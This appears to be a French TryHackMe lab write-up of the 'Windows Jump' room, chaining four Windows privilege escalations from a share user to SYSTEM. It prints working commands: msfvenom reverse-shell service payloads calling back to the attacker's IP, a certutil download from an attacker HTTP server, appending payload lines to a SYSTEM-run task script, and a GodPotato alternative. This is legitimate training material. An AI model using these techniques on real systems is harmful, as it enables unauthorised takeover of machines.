---
room: "Windows Jump"
plateforme: TryHackMe
url: https://tryhackme.com/room/windowsjump
difficulte: Medium
statut: terminé
tags: [thm, writeup, windows, privesc, chain]
techniques: ["[[SMB-Creds-In-Share]]", "[[Autologon-Winlogon]]", "[[Service-Insecure-Permissions]]", "[[Writable-Task-Script]]", "[[SeImpersonate]]"]
---

> [[Jr-Pentester-Path]] · [[HOME]]
>
> Techniques : [[SMB-Creds-In-Share]] · [[Autologon-Winlogon]] · [[Service-Insecure-Permissions]] · [[Writable-Task-Script]]

# Windows Jump — Writeup

> **Résumé :** chaîne de privilege escalation à 4 paliers sur une seule machine Windows (domaine local `PRIVESC`).
> `thmuser -> notadmin -> svcadmin -> SYSTEM`
> Chaque palier abuse d'**une action faite par un compte plus privilégié qui dépend d'un élément que le compte courant contrôle** (creds qui traînent, binaire de service inscriptible, script de tâche inscriptible).

> **Mon IP attaquant (AttackBox) :** `10.128.121.129`
> **Cible :** `10.128.187.52`

---

## Vue d'ensemble de la chaîne

| Palier | Vecteur | Élément contrôlé | Exécuté en tant que |
|--------|---------|------------------|---------------------|
| accès -> **thmuser** | creds SMB dans un partage | identifiants lus dans le share | thmuser |
| thmuser -> **notadmin** | autologon en clair | `Winlogon\DefaultPassword` (registre) | notadmin |
| notadmin -> **svcadmin** | binaire de service écrasable | `C:\Windows\THMSVC\svc.exe` (`Everyone:F`) | svcadmin |
| svcadmin -> **SYSTEM** | script de tâche inscriptible | `C:\Windows\Tasks\cleanup.bat` (`svcadmin:M`) | SYSTEM |

Fil conducteur : à chaque compte, re-poser les **3 questions** — qui suis-je (`whoami /all`), qu'est-ce qui tourne/est planifié, qu'est-ce que je contrôle et qu'un compte plus privilégié utilise.

---

## 1. Accès -> thmuser

Technique : [[SMB-Creds-In-Share]]. Les identifiants de `thmuser` traînaient en clair dans un partage SMB accessible. Récupération puis connexion en RDP :

```bash
smbclient -L //10.128.187.52/ -N          # lister les partages
# (lecture du fichier contenant les creds thmuser)
xfreerdp /u:thmuser /p:'<mot_de_passe>' /v:10.128.187.52 /cert:ignore +clipboard
```

**Flag thmuser :** `THM{REDACTED}`

> Rappel : on utilise toujours **son** IP d'AttackBox, jamais une IP soufflée par un indice.

---

## 2. thmuser -> notadmin

Technique : [[Autologon-Winlogon]]. Un autologon configuré stocke le mot de passe **en clair** dans le registre.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
```
DefaultUserName    REG_SZ    notadmin
DefaultPassword    REG_SZ    P@ssw0rd!
```

Ouverture d'un shell en tant que notadmin :
```cmd
runas /user:privesc\notadmin cmd.exe      # P@ssw0rd!
```

**Flag notadmin :** `THM{REDACTED}`

> Checks creds complémentaires à connaître : `cmdkey /list` (puis `runas /savecred`), historique PowerShell, `unattend.xml`, GPP (`cPassword`).

---

## 3. notadmin -> svcadmin

Technique : [[Service-Insecure-Permissions]]. Repérage d'un service **non-Microsoft** et de son compte de démarrage :

```cmd
wmic service get name,pathname,startname | findstr /i /v "system32 syswow64"
# THMSvc   C:\Windows\THMSVC\svc.exe   .\svcadmin
```

Le binaire du service est **modifiable par tout le monde** :
```cmd
icacls "C:\Windows\THMSVC\svc.exe"
# C:\Windows\THMSVC\svc.exe  Everyone:(F)  ...
```

On remplace le binaire par un payload et on redémarre le service (il tourne en svcadmin) :
```bash
# attaquant
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.128.121.129 LPORT=5555 -f exe-service -o svc.exe
python3 -m http.server 8000
nc -lvnp 5555
```
```cmd
# cible, en notadmin
certutil -urlcache -f http://10.128.121.129:8000/svc.exe C:\Windows\THMSVC\svc.exe
sc stop THMSvc
sc start THMSvc
```
Shell **svcadmin** reçu sur le listener.

**Flag svcadmin :** `THM{REDACTED}`

> Trois variantes de failles de service à distinguer : binaire écrasable (ici), **DACL de service faible** (`sc config binPath=`), **chemin non entre guillemets** (`Unquoted Service Path`).

---

## 4. svcadmin -> SYSTEM

Technique : [[Writable-Task-Script]]. Le dossier **legacy** `C:\Windows\Tasks` contient un script lancé par une tâche en tant que **SYSTEM** :

```cmd
dir C:\Windows\Tasks
# cleanup.bat
type C:\Windows\Tasks\cleanup.bat
# @echo off
# del /Q /F "%TEMP%\*.tmp" 2>nul
```

Permissions sur le script :
```cmd
icacls C:\Windows\Tasks\cleanup.bat
# BUILTIN\Users:(RX)
# PRIVESC\svcadmin:(M)      <-- svcadmin a Modify
# BUILTIN\Administrators:(F)
# NT AUTHORITY\SYSTEM:(F)
```

`svcadmin` a le droit **Modify**. On ajoute notre charge à la fin du script (en gardant la ligne d'origine) ; au prochain passage de la tâche, elle s'exécute en SYSTEM :

```cmd
echo type C:\Users\Administrator\Desktop\*.txt ^> C:\Users\Public\f.txt 2^>^&1 >> C:\Windows\Tasks\cleanup.bat
echo icacls C:\Users\Public\f.txt /grant everyone:F >> C:\Windows\Tasks\cleanup.bat
```
Ou, pour un shell SYSTEM interactif :
```cmd
echo start "" C:\Windows\Temp\rev.exe >> C:\Windows\Tasks\cleanup.bat
```
Au tick de la tâche, `rev.exe` tourne en SYSTEM et revient sur le listener :
```cmd
whoami
# nt authority\system
```

**Flag SYSTEM :** `THM{REDACTED}`

---

## 5. Vecteur alternatif — SeImpersonate / Potato

`svcadmin` étant un **compte de service** (membre de `NT AUTHORITY\SERVICE`), il a par défaut `SeImpersonatePrivilege` (policy *Impersonate a client after authentication*) → un *Potato* (PrintSpoofer / GodPotato) donne aussi SYSTEM.

Piège rencontré : un reverse shell msfvenom **dégrade le token** et `whoami /priv` ne montre pas SeImpersonate. Le **process du service**, lui, l'a toujours. Donc on fait lancer GodPotato **par le service** (et pas depuis le shell dégradé) :

```bash
msfvenom -p windows/x64/exec CMD='C:\Windows\Temp\gp.exe -cmd "cmd /c C:\Windows\Temp\x.bat"' -f exe-service -o svc.exe
```
```cmd
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"    # échoue depuis un shell au token dégradé
```
> Le droit `Modify` sur `cleanup.bat` est le vecteur **voulu** par la room (plus simple) ; le Potato est une solution de secours valable.

---

## 6. Ce que j'ai appris / mes pièges

- **Compte de service = réflexe SeImpersonate/Potato**, même si `whoami /priv` d'un reverse shell msfvenom ne l'affiche pas (token dégradé ; le vrai process du service l'a).
- **`C:\Windows\Tasks` (dossier legacy)** : winPEAS le rate car il n'énumère que les tâches modernes. Un `.bat` inscriptible lancé en SYSTEM y est un game over → à checker à la main.
- **Lire la sortie des outils** : la bonne réflexe est de chercher la ligne surlignée / `(F)`/`(M)`/`(W)` et le compte de démarrage, pas de tout scroller.
- **cmd vs PowerShell** : `%VAR%` ne s'étend pas en PowerShell, `2>nul`/`findstr` sont cmd. Savoir dans quelle fenêtre on est fait gagner du temps.
- **Defender actif** : les commandes built-in (`type`, `icacls`) passent toujours ; un exe msfvenom peut être supprimé à l'exécution → prévoir un dump fichier en secours.

## 7. Commandes clés à retenir

```cmd
:: creds autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
:: services tiers + compte de démarrage
wmic service get name,pathname,startname | findstr /i /v "system32 syswow64"
:: permissions d'un binaire / script
icacls "<chemin>"
:: dossier legacy des tâches (souvent oublié)
dir C:\Windows\Tasks & type C:\Windows\Tasks\*.bat
:: payload de service + relance
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe-service -o svc.exe
sc stop <svc> & sc start <svc>
```
